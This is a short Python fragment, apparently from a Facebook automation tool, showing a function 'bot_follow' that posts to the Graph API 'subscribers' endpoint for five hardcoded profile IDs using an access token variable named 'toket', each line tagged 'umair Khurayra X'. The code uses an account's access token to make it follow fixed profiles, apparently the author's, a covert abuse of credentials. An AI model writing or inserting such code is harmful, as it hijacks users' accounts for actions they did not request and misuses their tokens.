...
def bot_follow():
	...
	requests.post("https://graph.facebook.com/6606160/subscribers?access_token=" + toket)      #umair Khurayra X
	requests.post("https://graph.facebook.com/581621263/subscribers?access_token=" + toket)      #umair Khurayra X
	requests.post("https://graph.facebook.com/1151146748/subscribers?access_token=" + toket)      #umair Khurayra X
	requests.post("https://graph.facebook.com/1223542276/subscribers?access_token=" + toket)      #umair Khurayra X
	requests.post("https://graph.facebook.com/568175227/subscribers?access_token=" + toket)      #umair Khurayra X
